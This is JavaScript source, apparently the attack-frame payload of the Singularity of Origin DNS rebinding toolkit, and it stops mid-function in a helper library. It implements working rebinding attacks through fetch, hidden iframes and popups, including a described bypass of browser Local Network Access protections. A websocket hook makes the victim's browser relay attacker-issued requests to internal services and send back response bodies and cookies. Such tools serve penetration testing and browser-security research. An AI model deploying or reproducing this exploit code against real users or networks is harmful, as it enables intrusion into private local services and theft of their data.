// Wrap `fetch()` API, so we can invoke it:
// from the attack iframe (fetch attack method),
// from the child iframe of the attack iframe (iframe attack method),
// or from the popup window of the attack iframe (popup attack method).
// In the popup method, sooFetch is rebound to the popup's fetch() once the
// popup has navigated (top-level, hence exempt from Local Network Access
// restrictions) to the rebound target service, so subsequent requests are
// issued from a document committed from the local/loopback address space.
let sooFetch = function (resource, options) {
    return fetch(resource, options)
};

const Rebinder = () => {
    let headers = null;
    let cookie = null;
    let body = null;

    let url = null;
    let rebindingDoneFn = null;

    let timer = null;
    let popupWin = null;
    let popupName = 'soo-popup';
    let popupManagerMode = false;
    let popupTimer = null;
    let popupPollAttempts = 0;
    let popupNavigating = false;
    let popupRetryCount = 0;
    let rebindingStrategy = null;

    let payload = null;
    let interval = 60000;
    let wsproxyport = 3129;
    let rebindingSuccess = false;

    const rebindingStatusEl = document.getElementById('rebindingstatus');

    function initCommsWithParentFrame() {
        window.addEventListener('message', function (e) {
            console.log('attack frame', window.location.hostname, 'received message', e.data.cmd);

            switch (e.data.cmd) {
                case 'payload':
                    payload = e.data.param;
                    break;
                case 'interval':
                    interval = parseInt(e.data.param) * 1000;
                    break;
                case 'indextoken':
                    indextoken = e.data.param;
                    break;
                case 'wsproxyport':
                    wsproxyport = e.data.param;
                    break;
                case 'flushdns':
                    if (e.data.param.flushDns === true) {
                        console.log('Flushing Browser DNS cache.');
                        flushBrowserDnsCache(e.data.param.hostname);
                    }
                    break;
                case 'stop':
                    clearInterval(timer);
                    clearTimeout(timer);
                    clearInterval(popupTimer);
                    if (rebindingSuccess === false) {
                        rebindingStatusEl.innerText = `DNS rebinding failed!`;
                    }
                    break;
                case 'startFetch': // Fetch API attack method
                    console.log('payload.js: Fetch API attack method');
                    timer = setInterval(function () { run() }, interval);
                    console.log('frame', window.location.hostname, 'waiting', interval,
                        'milliseconds for dns update');
                    break;
                case 'startReloadChildFrame': // iframe attack method
                    console.log('payload.js: iframe attack method');
                    let f = document.createElement('iframe');
                    f.src = url
                    f.setAttribute('id', 'childFrame');
                    f.setAttribute('style', "display: none");
                    document.body.appendChild(f);
                    sooFetch = (resource, options) => {
                        const cw = document.getElementById('childFrame').contentWindow;
                        return cw.fetch(resource, options)
                    }
                    document.getElementById('childFrame').onload = onChildFrameLoad;
                    timer = setInterval(function () { document.getElementById('childFrame').src = `${window.origin}`; }, interval);
                    break;
                case 'startPopup': // popup (top-level navigation) attack method, LNA evasion
                    console.log('payload.js: popup attack method');
                    startPopupAttack(e.data.param);
                    break;
                case 'popupNavigationFailed':
                    // Manager could not navigate its placeholder popup
                    // (closed by the user, or never opened). Fall back to
                    // asking for a click in this frame, which opens a popup
                    // owned by this frame.
                    clearInterval(popupTimer);
                    popupManagerMode = false;
                    popupWin = null;
                    rebindingStatusEl.innerText = 'Popup blocked: click the button below to allow the popup attack.';
                    showPopupOpenButton();
                    break;
            }
        });
    };

    // iframe method based on research from Daniel Thatcher
    // https://www.intruder.io/research/split-second-dns-rebinding-in-chrome-and-safari
    function onChildFrameLoad() {
        console.log('payload.js: onChildFrameLoad');
        let doc = document.getElementById('childFrame').contentDocument || document.getElementById('childFrame').contentWindow.document;
        let content = doc.body.innerText;

        if (content.indexOf("Singularity of Origin") !== 0) { 
            injectScript( document.getElementById('childFrame'));
            let p = sooFetch(url, {
                credentials: 'omit',
            });
            run(p);
        }
    }
    
    // Popup method: LNA restrictions apply to fetch() and subframe (iframe)
    // navigations, but not to main-frame (top-level) navigations.
    //
    // Credit: this attack method is based on the Local Network Access
    // bypass via a new window / top-level navigation with DNS rebinding
    // reported in the Chromium issue tracker:
    //   https://issues.chromium.org/issues/475274565
    // See also WICG Local Network Access issue #48 on main-frame
    // navigations: https://github.com/WICG/local-network-access/issues/48
    //
    // The popup must be navigated to this frame's own origin (the DNS
    // rebinding hostname on the target port), NOT to a "localhost" literal:
    // a localhost popup would be cross-origin and its document/fetch would
    // be inaccessible to us. Once the rebinding hostname resolves to the
    // target, the popup navigation loads the target service while keeping
    // our origin (scheme/host/port are unchanged), and the popup document
    // is committed from the local/loopback address space, so fetch() calls
    // issued from the popup's realm are not blocked by LNA.
    function startPopupAttack(param) {
        // param is normally { popupName, placeholderOpened } from the
        // manager; tolerate a bare name string for backwards compatibility.
        let placeholderOpened = false;
        if (typeof param === 'string' && param) {
            popupName = param;
        } else if (param) {
            if (param.popupName) {
                popupName = param.popupName;
            }
            placeholderOpened = param.placeholderOpened === true;
        }
        // Fast path: try to retrieve the manager's placeholder popup by
        // name. This may succeed in some browsers, but do not rely on it:
        // while the popup is still about:blank it belongs to the manager's
        // origin, and browsers may refuse to hand a handle for a
        // cross-origin named window to this (cross-origin) attack frame.
        popupWin = window.open('', popupName);
        if (popupWin && !popupWin.closed) {
            console.log(`payload.js: reclaimed popup window '${popupName}'`);
            startPopupAfterOpen();
            return;
        }
        popupWin = null;
        if (placeholderOpened) {
            // Manager-mediated mode: the manager kept its own, perfectly
            // valid handle to the placeholder it opened on the user's
            // click. We cannot obtain that handle here (yet), but we don't
            // need it to navigate the popup: setting location on a window
            // is allowed cross-origin, so we probe for the rebinding from
            // here and simply ask the manager (via postMessage) to perform
            // the popup navigation when the time comes. After that
            // navigation the popup is on *our* origin (the rebinding
            // hostname), and we can reclaim its handle by name and read it.
            // The attack therefore starts automatically, with no second
            // click, even though this frame never had user activation.
            popupManagerMode = true;
            console.log(`payload.js: using manager placeholder popup '${popupName}' (manager-mediated navigation)`);
            startPopupAfterOpen();
            return;
        }
        // No placeholder was pre-opened (e.g. attack started without a
        // gesture, or via scan/autoattack) and creating one from here was
        // blocked. Offer a click inside this frame instead: a real click
        // here carries activation in *this* document.
        console.log('payload.js: popup blocked, waiting for user click');
        rebindingStatusEl.innerText = 'Popup blocked: click the button below to allow the popup attack.';
        window.parent.postMessage({ status: 'popupBlocked' }, '*');
        showPopupOpenButton();
    }

    function showPopupOpenButton() {
        if (document.getElementById('popupOpenButton')) {
            return;
        }
        let b = document.createElement('button');
        b.setAttribute('id', 'popupOpenButton');
        b.innerText = 'Open popup for DNS rebinding attack (LNA bypass)';
        b.onclick = function () {
            popupWin = window.open('about:blank', popupName, 'width=900,height=700');
            if (popupWin) {
                popupManagerMode = false;
                b.remove();
                startPopupAfterOpen();
            }
        };
        document.body.appendChild(b);
    }

    // Entry point once we have (or the manager has) a popup window.
    //
    // For most strategies ('fs', 'rr', 'rd') we probe with fetch() and only
    // navigate the popup once the rebinding is detected. 'ma' (multiple
    // answers) is different: every DNS answer contains both the attacker
    // and target addresses, and rebinding only completes after a request
    // to the attacker (more than 3s into the session) trips Singularity's
    // iptables handler, after which DNS answers become target-only. There
    // is no clean fetch() oracle for that -- a failed fetch can mean LNA,
    // a firewall RST, or plain address selection -- so for 'ma' the popup
    // navigation itself is the probe: navigate, inspect what committed,
    // and navigate again until the target commits.
    function startPopupAfterOpen() {
        popupRetryCount = 0;
        if (rebindingStrategy === 'ma') {
            console.log('payload.js: popup + multiple-answers strategy: using navigation-driven probe');
            rebindingStatusEl.innerText = 'Popup opened. Repeatedly navigating popup until it lands on the target (multiple answers)...';
            navigatePopupToTarget();
        } else {
            beginPopupProbe();
        }
    }

    // Schedule another popup navigation (multiple-answers loop). The delay
    // is capped at 1s for 'ma', matching Singularity's guidance for that
    // strategy: retries need to keep hitting the attacker to trip the
    // firewall handler, and to catch the browser falling back to the
    // target address promptly once DNS answers become target-only.
    function schedulePopupRenavigation(reason) {
        clearInterval(popupTimer);
        popupTimer = null;
        popupNavigating = false;
        popupRetryCount += 1;
        if (popupRetryCount > 30) {
            console.log(`payload.js: popup navigation loop giving up after 30 retries (${reason})`);
            rebindingStatusEl.innerText = 'DNS rebinding failed after repeated popup navigations!';
            window.parent.postMessage({ status: 'error' }, '*');
            return;
        }
        const delay = Math.min(interval, 1000);
        console.log(`payload.js: popup will navigate again in ${delay}ms (${reason}, retry ${popupRetryCount})`);
        rebindingStatusEl.innerText = `Popup did not land on the target (${reason}). Retrying navigation...`;
        clearInterval(timer);
        timer = setTimeout(navigatePopupToTarget, delay);
    }

    // Poll with this frame's own fetch() until DNS has rebound.
    // Before rebinding we get the Singularity HTTP response; after
    // rebinding, browsers enforcing LNA reject the fetch with a TypeError
    // (public document -> local/loopback destination). That rejection is
    // our signal to navigate the popup. On browsers without LNA, the fetch
    // simply succeeds against the target (no Singularity header).
    function beginPopupProbe() {
        popupNavigating = false;
        rebindingStatusEl.innerText = 'Popup opened. Waiting for DNS rebinding before navigating popup...';
        timer = setInterval(probePopupRebinding, interval);
        probePopupRebinding();
    }

    function probePopupRebinding() {
        if (popupNavigating) {
            return; // a probe fetch already triggered the popup navigation
        }
        if (!popupManagerMode && (!popupWin || popupWin.closed)) {
            clearInterval(timer);
            rebindingStatusEl.innerText = 'Popup was closed. DNS rebinding aborted.';
            return;
        }
        fetch(url, { credentials: 'omit' })
            .then(function (r) {
                if (r.headers.get('X-Singularity-Of-Origin') === 't') {
                    console.log('payload.js: popup probe: still resolving to Singularity, waiting...');
                    return;
                }
                console.log('payload.js: popup probe: fetch reached non-Singularity host, navigating popup');
                navigatePopupToTarget();
            })
            .catch(function (e) {
                console.log('payload.js: popup probe: fetch failed (' + e + '), assuming DNS rebound, navigating popup');
                navigatePopupToTarget();
            });
    }

    function navigatePopupToTarget() {
        if (popupNavigating) {
            return;
        }
        popupNavigating = true;
        clearInterval(timer);
        timer = null;
        popupPollAttempts = 0;
        const targetUrl = new URL(url, window.location.href).href;
        rebindingStatusEl.innerText = `Navigating popup to ${targetUrl} (top-level navigation)...`;
        if (popupManagerMode) {
            // Ask the manager to navigate the placeholder it owns. Setting
            // a window's location is allowed cross-origin, and the manager
            // performs it with its own handle -- no popup is created here,
            // so no user activation is needed in this frame.
            console.log('payload.js: asking manager to navigate its placeholder popup');
            window.parent.postMessage({ status: 'navigatePopup', url: targetUrl }, '*');
        } else {
            try {
                popupWin.location.href = targetUrl;
            } catch (e) {
                console.log('payload.js: could not navigate popup: ' + e);
            }
        }
        clearInterval(popupTimer);
        popupTimer = setInterval(checkPopupNavigation, 250);
    }

    function checkPopupNavigation() {
        popupPollAttempts += 1;
        if (!popupWin) {
            // Manager-mediated mode: (re)acquire the popup handle by name.
            // Before the manager's navigation this may keep returning null
            // (popup is still on the manager's origin); once the popup has
            // navigated to the rebinding hostname it is same-origin with
            // this frame and its handle/document become accessible.
            popupWin = window.open('', popupName);
            if (!popupWin) {
                if (popupPollAttempts > 120) { // ~30s
                    clearInterval(popupTimer);
                    console.log('payload.js: could not acquire popup handle after navigation');
                    rebindingStatusEl.innerText = 'Could not acquire the popup window after navigation.';
                    window.parent.postMessage({ status: 'error' }, '*');
                }
                return;
            }
            console.log(`payload.js: acquired popup handle '${popupName}' after navigation`);
        }
        if (popupWin.closed) {
            clearInterval(popupTimer);
            rebindingStatusEl.innerText = 'Popup was closed. DNS rebinding failed!';
            window.parent.postMessage({ status: 'error' }, '*');
            return;
        }
        try {
            const doc = popupWin.document;
            if (!doc || popupWin.location.href === 'about:blank') {
                return;
            }
            if (doc.readyState !== 'complete') {
                return;
            }
            const html = doc.documentElement ? doc.documentElement.outerHTML : '';
            const text = doc.body ? doc.body.innerText : '';
            const onSingularity = (typeof indextoken !== 'undefined' && indextoken && html.includes(indextoken)) ||
                html.includes('Singularity of Origin');
            if (onSingularity) {
                // Popup landed on the attacker server: DNS had not
                // (fully) rebound yet.
                clearInterval(popupTimer);
                popupTimer = null;
                if (rebindingStrategy === 'ma') {
                    // With multiple answers this is expected, and the hit
                    // on the attacker is itself useful (it can trip the
                    // firewall handler). Navigate again.
                    console.log('payload.js: popup landed on Singularity (multiple answers), navigating again');
                    schedulePopupRenavigation('landed on Singularity');
                } else {
                    console.log('payload.js: popup landed on Singularity, resuming probe');
                    beginPopupProbe();
                }
                return;
            }
            if (!html) {
                if (popupPollAttempts < 40) {
                    return; // navigation may still be committing an error/empty page
                }
                if (rebindingStrategy === 'ma') {
                    schedulePopupRenavigation('empty popup document');
                    return;
                }
            }
            // Popup committed a document from the target service, under
            // our origin. Rebind sooFetch into the popup's realm so all
            // registered payloads run from the local address space.
            clearInterval(popupTimer);
            popupTimer = null;
            sooFetch = (resource, options) => popupWin.fetch(resource, options);
            rebindingStatusEl.innerText = 'Popup navigated to target. Fetching via popup window...';
            let p = sooFetch(url, { credentials: 'omit' });
            p.then(
                function (r) {
                    // With multiple answers, even a popup that committed
                    // the target can have a later fetch routed back to the
                    // attacker address. Treat that as another navigation
                    // retry rather than a (silent) failed rebinding.
                    if (rebindingStrategy === 'ma' &&
                        r.headers.get('X-Singularity-Of-Origin') === 't') {
                        console.log('payload.js: popup fetch landed on Singularity (multiple answers), navigating again');
                        schedulePopupRenavigation('popup fetch landed on Singularity');
                        return;
                    }
                    run(p);
                },
                function (fetchError) { popupNavigationFallback(text || html, fetchError); }
            );
        } catch (e) {
            // Cross-Origin-Opener-Policy on the target, a redirect to a
            // different origin (e.g. a localhost literal), or a browser
            // error page makes the popup document inaccessible.
            if (popupPollAttempts > 40) {
                clearInterval(popupTimer);
                popupTimer = null;
                if (rebindingStrategy === 'ma') {
                    // With multiple answers, an error page most likely
                    // means the navigation hit the attacker address while
                    // Singularity's iptables RST rule was active (or the
                    // browser pinned the attacker address). That state is
                    // transient (~5s rule, ~10s DNS TTL), so wait and
                    // navigate again instead of giving up.
                    console.log('payload.js: popup document inaccessible (multiple answers), will navigate again: ' + e);
                    schedulePopupRenavigation('popup error page');
                } else {
                    console.log('payload.js: popup document inaccessible (COOP/redirect/error page?): ' + e);
                    rebindingStatusEl.innerText = 'Popup navigation succeeded but its document is inaccessible (COOP, redirect to another origin, or error page).';
                    window.parent.postMessage({ status: 'error' }, '*');
                }
            }
        }
    }

    // Navigation-only fallback: if fetch() from the popup realm is still
    // blocked in some browser, at least deliver what the top-level
    // navigation already read (equivalent to a Simple Fetch Get of '/').
    function popupNavigationFallback(navigationBody, fetchError) {
        console.log('payload.js: popup fetch failed (' + fetchError + '), falling back to navigation body');
        body = navigationBody;
        headers = new Headers();
        try { cookie = popupWin.document.cookie; } catch (e) { cookie = ''; }
        rebindingSuccess = true;
        rebindingStatusEl.innerText = 'DNS rebinding successful (navigation-only, popup fetch blocked)!';
        window.parent.postMessage({
            status: 'success',
            response: body,
            httpStatus: 0
        }, '*');
        rebindingDoneFn(payload, headers, cookie, body, wsproxyport);
    }

    function injectScript(frame) {
        let doc = frame.contentDocument || frame.contentWindow.document;
        let script = document.createElement("script");
        script.setAttribute("type", "text/javascript");
        script.innerHTML = `${sooFetch.toString()};`;
        doc.body.append(script);
    }

    function init(myUrl, myRebindingDoneFn) {
        url = myUrl;
        rebindingDoneFn = myRebindingDoneFn;
        // The rebinding strategy is encoded in this frame's hostname:
        // s-<attacker>.<target>-<session>-<strategy>-e.<domain>
        try {
            const parts = window.location.hostname.match(/(?:[^-]|--)+/g);
            if (parts && parts[3]) {
                rebindingStrategy = parts[3];
            }
        } catch (e) { /* strategy stays null; popup uses the fetch probe */ }
        console.log(`payload.js: rebinding strategy: ${rebindingStrategy}`);
        initCommsWithParentFrame();
        window.parent.postMessage({
            status: 'start'
        }, "*");
    };

    function run(prom) {
        let p = null;
        if (prom) {
            p = prom;
        } else {
            p = sooFetch(url, {
                credentials: 'omit',
            })
        }
            p.then(function (r) {

                let headerCount = 0;
                for (let pair of r.headers.entries()) {
                    headerCount += 1;
                };

                if (headerCount === 0) {
                    throw new Error('invalidHeaderCount');
                }

                if (r.headers.get('X-Singularity-Of-Origin') === 't') {
                    throw new Error('hasSingularityHeader');
                }

                headers = r.headers;
                cookie = document.cookie;

                // Store the response object to access status later
                return r.text().then(text => ({ text, status: r.status, ok: r.ok }));
            })
            .then(function (responseData) { // we successfully received the server response
                const responseText = responseData.text;
                
                console.log(`Received response: status=${responseData.status}, bodyLength=${responseText.length}, ok=${responseData.ok}`);

                if (responseText.includes(indextoken)) {
                    throw new Error('hasToken');
                }

                body = responseText;
                clearInterval(timer); // stop the attack timer
                // Report success to parent frame
                window.parent.postMessage({
                    status: 'success',
                    response: body,
                    httpStatus: responseData.status
                }, "*");
                // Terminate the attack
                rebindingSuccess = true;
                rebindingStatusEl.innerText = `DNS rebinding successful! (HTTP ${responseData.status})`;
                rebindingDoneFn(payload, headers, cookie, body, wsproxyport);
            })
            .catch(function (error) {
                if (error instanceof TypeError) { // We cannot establish an HTTP connection
                    console.log('frame ' + window.location.hostname + ' could not load: ' + error);
                    window.parent.postMessage({
                        status: 'error',
                    }, "*");
                } else if (error.message === 'hasSingularityHeader' ||
                    error.message === 'hasToken' ||
                    error.message === 'invalidHeaderCount') {
                    console.log(`DNS rebinding did not happen yet: ${window.location.host} Error: ${error.message}`)
                } else if (error.message == 'requiresHttpAuthentication') {
                    console.log('This resource requires HTTP Authentication.');
                    window.parent.postMessage({
                        status: 'requiresHttpAuthentication',
                    }, "*");
                    rebindingDoneFn(payload, headers, cookie, null);
                } else { // We did not handle something
                    console.log('Unhandled error: ' + error);
                    window.parent.postMessage({
                        status: 'error',
                    }, "*");
                }
            });
    };

    return {
        init,
        run,
    }
}

function timeout(ms, promise, controller) {
    return new Promise(function (resolve, reject) {
        setTimeout(function () {
            controller.abort();
            reject(new Error('timeout'))
        }, ms)
        promise.then(resolve, reject)
    })
}

function begin(url) {
    const hostnameEl = document.getElementById('hostname');
    const arr = window.location.hostname.match(/(?:[^-]|--)+/g); // Split on '-', not '--'
    const sourceTarget = arr[1].split(/\.(.*)/s);
    const target = decodeIpHexStringOrEcho(sourceTarget[1]).replaceAll('--','-'); // Remove escaping in CNAMEs
    const port = document.location.port ? document.location.port : '80';
    hostnameEl.innerText = `target: ${target}:${port}, session: ${arr[2]}, strategy: ${arr[3]}`;
    r = Rebinder();
    r.init(url, attack);
}

function wait(n) { return new Promise(resolve => setTimeout(resolve, n)); }


// Attempt to decode a string input as an IPv4, IPv6 or CNAME
// 'deadbeef' would be interpreted '222.173.190.239', which may not be what you want
// In general with Singularity, the CNAME would be 'localhost' or something like a FQDN e.g., 'www.example.com'
// and these will be parsed correctly
function decodeIpHexStringOrEcho(input) {

    if (typeof input !== 'string') {
        throw new Error("Input must be a string");
    }

    const hexString = input.trim();

    // Only attempt decode for exact 8 (IPv4) or 32 (IPv6) hex chars
    if (!/^(?:[0-9A-Fa-f]{8}|[0-9A-Fa-f]{32})$/.test(hexString)) {
        return input; // not a candidate — leave as-is (e.g., a CNAME)
    }

    // Parse hex into bytes
    const len = hexString.length;
    const bytes = new Uint8Array(len / 2);
    for (let i = 0; i < len; i += 2) {
        const byte = parseInt(hexString.slice(i, i + 2), 16);
        if (Number.isNaN(byte)) {
            return input;
        }
        bytes[i / 2] = byte;
    }

    // Render IPv4 or IPv6
    if (bytes.length === 4) {
        return Array.from(bytes).join('.');
    } else if (bytes.length === 16) {
        return toIPv6String(bytes);
    }

    return input;
}

function toIPv6String(bytes) {
    if (!(bytes instanceof Uint8Array) || bytes.length !== 16) {
        return String(bytes);
    }

    // Build 8 groups of 16 bits in lowercase hex (no leading zeros removed yet)
    const groups = new Array(8);
    for (let i = 0; i < 8; i++) {
        const v = (bytes[i * 2] << 8) | bytes[i * 2 + 1];
        groups[i] = v.toString(16);
    }

    // Find the longest run of consecutive "0" groups for "::" compression
    let bestStart = -1, bestLen = 0;
    let curStart = -1, curLen = 0;

    for (let i = 0; i < 8; i++) {
        if (groups[i] === '0') {
            if (curStart === -1) curStart = i;
            curLen++;
        } else if (curStart !== -1) {
            if (curLen > bestLen) { bestStart = curStart; bestLen = curLen; }
            curStart = -1; curLen = 0;
        }
    }
    if (curStart !== -1 && curLen > bestLen) {
        bestStart = curStart; bestLen = curLen;
    }

    // Compress only if the run length >= 2
    let result;
    if (bestLen > 1) {
        const head = groups.slice(0, bestStart).join(':');
        const tail = groups.slice(bestStart + bestLen).join(':');
        result = head && tail ? `${head}::${tail}` : head ? `${head}::` : tail ? `::${tail}` : '::';
    } else {
        result = groups.join(':');
    }

    return `[${result}]`;
}

// Request target to establish a websocket to Singularity server and wait for commands
// Implements retries to handle multiple answer strategy and firewall blocks.
function webSocketHook(headers, initialCookie, wsProxyPort, retry) {
    if (retry < 0) {
        console.log(`Abandoning websocket connection to Singularity after too many retries for: ${window.location.host}`);
        return;
    }
    const arr = window.location.hostname.match(/(?:[^-]|--)+/g); // Split on '-', not '--'
    const sourceTarget = arr[1].split(/\.(.*)/s);
    const target = sourceTarget[0];

    const server = decodeIpHexStringOrEcho(target).replaceAll('--','-');
    const wsurl = `${server}:${wsProxyPort}`
    let httpAuth = false;

    // Did successful rebinding request required HTTP Auth?
    if (headers.get('www-authenticate') !== null) {
        httpAuth = true;
    };

    let ws = new WebSocket(`ws://${wsurl}/soows`);

    ws.onmessage = function (m) {
        const data = JSON.parse(m.data);

        // if our first rebinding request required HTTP Auth,
        // choose to not pass cookies between target and victim from now on,
        // as fetch() credential = 'include' will trigger a dialog box
        // if HTTP auth is required in target's browser
        // therefore informing target of ongoing attack.
        // Could be a problem if CSRF tokens are passed in cookies...
        if (httpAuth === true) {
            data.payload.fetchrequest.credentials = 'omit';
        }

        if (data.command === 'fetch') {
            if (data.payload.fetchrequest.method === 'GET' || data.payload.fetchrequest.message === 'HEAD') {
                delete data.payload.fetchrequest.body;
            } else {
                if (data.payload.fetchrequest.body !== null) {
                    data.payload.fetchrequest.body = atobUTF8(data.payload.fetchrequest.body)
                }
            }
            const messageID = data.payload.fetchrequest.id
            let fetchResponse = {
                "id": messageID,
                "command": "fetchResponse",
                "response": {},
                "body": "",
            }

            const fetch_retry = (url, options, n) => sooFetch(url, options)
                .then(function (r) {
                    fetchResponse.response.headers = r.headers;
                    fetchResponse.response.ok = r.ok;
                    fetchResponse.response.redirected = r.redirected;
                    fetchResponse.response.status = r.status;
                    fetchResponse.response.type = r.type;
                    fetchResponse.response.url = r.url;
                    fetchResponse.response.body = r.body;
                    fetchResponse.response.bodyUsed = r.bodyUsed;
                    fetchResponse.response.headers = {};
                    for (let pair of r.headers.entries()) {
                        fetchResponse.response.headers[pair[0]] = pair[1];
                    };
                    fetchResponse.response.cookies = getCookies();
                    return r.arrayBuffer()
                })
                .then(function (result) {
                    fetchResponse.body = base64ArrayBuffer(result);
                    ws.send(JSON.stringify(fetchResponse));
                }).catch(function (e) {
                    console.log(`Hook and command payload's fetch failed for frame ${window.location}: ${e}`);
                    if (n === 1) throw "Hook and command payload's fetch failed";
                    wait(1000).then(() => { return fetch_retry(url, options, n - 1); })
                });;

            fetch_retry(data.payload.url, data.payload.fetchrequest, 10);

        }

    }
    ws.onopen = function (evt) { }
    ws.onerror = function (e) {
        console.log(`WS error: ${e}`);
    }

    wait(1000)
        .then(() => {
            if (ws.readyState !== 1) {
                webSocketHook(headers, initialCookie, wsProxyPort, retry - 1);
            } else {
                console.log(`Successfully connected to Singularity via websockets for: ${window.location.host}`);
            }
        })
}

function buildCookie(val, days) {
    let expires = "";
    if (days) {
        let date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = '; expires=' + date.toUTCString();
    }
    return `${val} ${expires} ; path=/`;
}

function getCookies() {
    return document.cookie === '' ? [] : document.cookie.split(';').map(x => x.trim());

}

function responseOKOrFail(errorString) {
    return function (r) {
        if (r.ok) {
            console.log('attack frame ', window.location.hostname, ' received a response');
            return r.text()
        } else {
            throw new Error(errorString)
        }
    }
}

// Converts an ArrayBuffer directly to base64, without any intermediate 'convert to string then
// use window.btoa' step. According to my tests, this appears to be a faster approach:
// http://jsperf.com/encoding-xhr-image-data/5

/*
MIT LICENSE
Copyright 2011 Jon Leighton
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/


function base64ArrayBuffer(arrayBuffer) {
    var base64 = ''
    var encodings = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

    var bytes = new Uint8Array(arrayBuffer)
    var byteLength = bytes.byteLength
    var byteRemainder = byteLength % 3
    var mainLength = byteLength - byteRemainder

    var a, b, c, d
    var chunk

    // Main loop deals with bytes in chunks of 3
    for (var i = 0; i < mainLength; i = i + 3) {
        // Combine the three bytes into a single integer
        chunk = (bytes[i] << 16) | (bytes[i + 1] << 8) | bytes[i + 2]

        // Use bitmasks to extract 6-bit segments from the triplet
        a = (chunk & 16515072) >> 18 // 16515072 = (2^6 - 1) << 18
        b = (chunk & 258048) >> 12 // 258048   = (2^6 - 1) << 12
        c = (chunk & 4032) >> 6 // 4032     = (2^6 - 1) << 6
        d = chunk & 63 // 63       = 2^6 - 1

        // Convert the raw binary segments to the appropriate ASCII encoding
        base64 += encodings[a] + encodings[b] + encodings[c] + encodings[d]
    }

    // Deal with the remaining bytes and padding
    if (byteRemainder == 1) {
        chunk = bytes[mainLength]

        a = (chunk & 252) >> 2 // 252 = (2^6 - 1) << 2

        // Set the 4 least significant bits to zero
        b = (chunk & 3) << 4 // 3   = 2^2 - 1

        base64 += encodings[a] + encodings[b] + '=='
    } else if (byteRemainder == 2) {
        chunk = (bytes[mainLength] << 8) | bytes[mainLength + 1]

        a = (chunk & 64512) >> 10 // 64512 = (2^6 - 1) << 10
        b = (chunk & 1008) >> 4 // 1008  = (2^6 - 1) << 4

        // Set the 2 least significant bits to zero
        c = (chunk & 15) << 2 // 15    = 2^4 - 1

        base64 += encodings[a] + encodings[b] + encodings[c] + '='
    }

    return base64
}

//https://github.com/anonyco/BestBase64EncoderDecoder

(function (window) {
    "use strict";
    var log = Math.log;
    var LN2 = Math.LN2;
    var clz32 = Math.clz32 || function (x) {
        return 31 - log(x >>> 0) / LN2 | 0
    };
    var fromCharCode = String.fromCharCode;
    var originalAtob = atob;
    var originalBtoa = btoa;

    function btoaReplacer(nonAsciiChars) {
        // make the UTF string into a binary UTF-8 encoded string
        var point = nonAsciiChars.charCodeAt(0);
        if (point >= 0xD800 && point <= 0xDBFF) {
            var nextcode = nonAsciiChars.charCodeAt(1);
            if (nextcode !== nextcode) // NaN because string is 1 code point long
                return fromCharCode(0xef /*11101111*/, 0xbf /*10111111*/, 0xbd /*10111101*/);
            // https://mathiasbynens.be/notes/javascript-encoding#surrogate-formulae
            if (nextcode >= 0xDC00 && nextcode <= 0xDFFF) {
                point = (point - 0xD800) * 0x400 + nextcode - 0xDC00 + 0x10000;
                if (point > 0xffff)
                    return fromCharCode(
                        (0x1e /*0b11110*/ << 3) | (point >>> 18),
                        (0x2 /*0b10*/ << 6) | ((point >>> 12) & 0x3f /*0b00111111*/),
                        (0x2 /*0b10*/ << 6) | ((point >>> 6) & 0x3f /*0b00111111*/),
                        (0x2 /*0b10*/ << 6) | (point & 0x3f /*0b00111111*/)
                    );
            } else return fromCharCode(0xef, 0xbf, 0xbd);
        }
        if (point <= 0x007f) return inputString;
        else if (point <= 0x07ff) {
            return fromCharCode((0x6 << 5) | (point >>> 6), (0x2 << 6) | (point & 0x3f));
        } else return fromCharCode(
            (0xe /*0b1110*/ << 4) | (point >>> 12),
            (0x2 /*0b10*/ << 6) | ((point >>> 6) & 0x3f /*0b00111111*/),
            (0x2 /*0b10*/ << 6) | (point & 0x3f /*0b00111111*/)
        );
    }
    window["btoaUTF8"] = function (inputString, BOMit) {
        return originalBtoa((BOMit ? "\xEF\xBB\xBF" : "") + inputString.replace(
            /[\x80-\uD7ff\uDC00-\uFFFF]|[\uD800-\uDBFF][\uDC00-\uDFFF]?/g, btoaReplacer
        ));
    }
    //////////////////////////////////////////////////////////////////////////////////////
    function atobReplacer(encoded) {
        var codePoint = encoded.charCodeAt(0) << 24;
        var leadingOnes = clz32(~codePoint);
        var endPos = 0,
            stringLen = encoded.length;
        var result = "";
        if (leadingOnes < 5 && stringLen >= leadingOnes) {
            codePoint = (codePoint << leadingOnes) >>> (24 + leadingOnes);
            for (endPos = 1; endPos < leadingOnes; ++endPos)
                codePoint = (codePoint << 6) | (encoded.charCodeAt(endPos) & 0x3f /*0b00111111*/);
            if (codePoint <= 0xFFFF) { // BMP code point
                result += fromCharCode(codePoint);
            } else if (codePoint <= 0x10FFFF) {
                // https://mathiasbynens.be/notes/javascript-encoding#surrogate-formulae
                codePoint -= 0x10000;
                result += fromCharCode(
                    (codePoint >> 10) + 0xD800, // highSurrogate
                    (codePoint & 0x3ff) + 0xDC00 // lowSurrogate
                );
            } else endPos = 0; // to fill it in with INVALIDs
        }
        for (; endPos < stringLen; ++endPos) result += "\ufffd"; // replacement character
        return result;
    }
    window["atobUTF8"] = function (inputString, keepBOM) {
        if (!keepBOM && inputString.substring(0, 3) === "\xEF\xBB\xBF")
            inputString = inputString.substring(3); // eradicate UTF-8 BOM
        // 0xc0 => 0b11000000; 0xff => 0b11111111; 0xc0-0xff => 0b11xxxxxx
        // 0x80 => 0b10000000; 0xbf => 0b10111111; 0x80-0xbf => 0b10xxxxxx
